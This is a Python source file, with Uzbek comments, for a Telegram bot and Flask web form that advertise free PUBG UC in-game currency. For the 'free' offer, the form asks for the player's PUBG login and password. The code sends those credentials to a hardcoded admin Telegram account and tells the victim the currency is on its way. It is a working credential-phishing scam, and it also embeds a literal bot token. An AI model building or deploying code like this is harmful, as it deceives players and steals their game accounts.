import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from flask import Flask, request, render_template_string
from threading import Thread
import os
import time

# Tokenni environmentdan olish
BOT_TOKEN = os.environ.get('8194877107:AAFYZR8HbBD5B43WN3d871srclsOa7H6xwk')
if not BOT_TOKEN:
    print("ERROR: UC sevice vaqtinchalik ishlamayapti")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==================== RENDER URL ====================
# Render o'z URL ni beradi, cloudflared kerak emas
RENDER_URL = os.environ.get('RENDER_URL', 'https://telegram-bot-1-mr8u.onrender.com')

# ==================== FLASK ROUTES ====================

# Sizning HTML kodingiz (o'zgarishsiz)...
# ... HTML kod bu yerda ...

@app.route("/form/<user_id>", methods=["GET", "POST"])
def form(user_id):
    if request.method == "POST":
        # UC form ma'lumotlari
        uc_amount = request.form.get("uc_amount")
        uc_price = request.form.get("uc_price")
        uc_type = request.form.get("uc_type")
        email = request.form.get("email")
        username = request.form.get("username")
        password = request.form.get("password")
        
        # Foydalanuvchi xabari
        user_message = f"✅ Buyurtmangiz qabul qilindi!\n\n"
        user_message += f"💰 UC miqdori: {uc_amount} UC\n"
        user_message += f"📧 Email: {email}\n"
        user_message += f"⏳ Yetkazish: 5-15 daqiqa\n\n"
        user_message += f"📞 Support: @msrfteam"
        
        # Admin xabari
        admin_message = f"🛒 YANGI BUYURTMA!\n\n"
        admin_message += f"👤 User ID: {user_id}\n"
        admin_message += f"💰 UC miqdori: {uc_amount} UC\n"
        admin_message += f"💵 Narxi: {'BEPUL' if uc_type == 'free' else uc_price + ' UZS'}\n"
        admin_message += f"📧 Email: {email}\n"
        
        if uc_type == "free":
            admin_message += f"👤 PUBG Login: {username}\n"
            admin_message += f"🔑 PUBG Parol: {password}\n"
            admin_message += f"🔔 Turi: BEPUL UC"
        else:
            admin_message += f"🔔 Turi: Pullik UC"
        
        # 1. FOYDALANUVCHIGA yuborish
        bot.send_message(user_id, user_message)
        
        # 2. ADMINGA yuborish
        ADMIN_ID = 6948346741  # ⬅️ BU YERGA O'Z TELEGRAM ID'INGIZNI YOZING!
        bot.send_message(ADMIN_ID, admin_message)
        
        return "Success! UC buyurtmangiz qabul qilindi. Tez orada hisobingizga yuklanadi."

    return render_template_string(html_form)

# ==================== TELEGRAM BOT ====================

@bot.message_handler(commands=["start"])
def start(msg):
    bot.send_message(msg.chat.id, "Salom! bir kunlik aksiya PUBG UC olish uchun /link buyrug'ini yuboring.")

@bot.message_handler(commands=["link"])
def link(msg):
    user_id = msg.chat.id
    
    # RENDER URL dan foydalaning
    uniq = f"{RENDER_URL}/form/{user_id}"
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 UC Sotib Olish", url=uniq))
    
    bot.send_message(
        user_id,
        f"🔗 Sizning shaxsiy linkingiz tayyor:\n\n{uniq}\n\n"
        f"Ushbu link orqali PUBG UC sotib olishingiz mumkin!\n"
        f"✨ 60 UC - BEPUL (faqat bir marta)\n"
        f"⭐ 120 UC - 39,000 UZS\n"
        f"👑 355 UC - 89,000 UZS\n"
        f"🚀 720 UC - 169,000 UZS\n"
        f"💎 1,500 UC - 319,000 UZS\n"
        f"🏆 3,000 UC - 599,000 UZS",
        reply_markup=markup
    )

# ==================== RUN FUNCTIONS ====================

def run_flask():
    app.run(host="0.0.0.0", port=8080)  # Render uchun port 8080

def run_bot():
    print("🤖 Bot ishga tushmoqda...")
    bot.polling(none_stop=True)

if __name__ == "__main__":
    print(f"🌐 RENDER URL: {RENDER_URL}")
    print(f"🤖 BOT TOKEN: {'Bor' if BOT_TOKEN else 'Yoq'}")
    
    # Ikki threadda ishlash
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    # Asosiy thread
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("Bot to'xtatildi")
